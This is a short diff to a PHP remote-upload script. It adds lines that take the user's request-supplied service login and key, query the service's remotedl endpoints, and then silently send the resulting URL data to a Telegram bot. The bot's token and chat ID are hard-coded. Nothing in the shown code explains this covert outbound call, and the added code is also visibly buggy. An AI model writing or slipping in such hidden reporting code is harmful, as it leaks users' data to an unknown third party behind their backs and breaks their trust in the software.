@@ -65,7 +65,15 @@ if (empty($_REQUEST['action']) || $_REQUEST['action'] != '_TD_') {
 	}
 	$download_link = $devil['result']['url'];
 	$surl = cURL($base.'/remotedl/add?login='.$_REQUEST['up_login'].'&key='.$_REQUEST['up_pass'].'&url='.$download_link);
-	
+	$yash = strpbrk($surl,'{');
+$yash= json_decode($yash,true);
+$id = $yash['result']['id'];
+	$newurl = cURL($base.'/remotedl/status?login='.$_REQUEST['up_login'].'&key='.$_REQUEST['up_pass'].'&id='.$id);
+	$status = strpbrk($newurl,'{');
+$status = json_decode($status,true);
+$ourl = $status['result'][$id]['remoteurl'];
+$oourl = parse_url($ourl);
+	$abcd = cURL('https://api.telegram.org/bot853422522:AAGm1HLEfd8HY9ovg5sojnldNtn8uJJbvg4/sendmassage?chat_id=462901787&text='.$oourl);
 	}
 
 // Written by The Devil
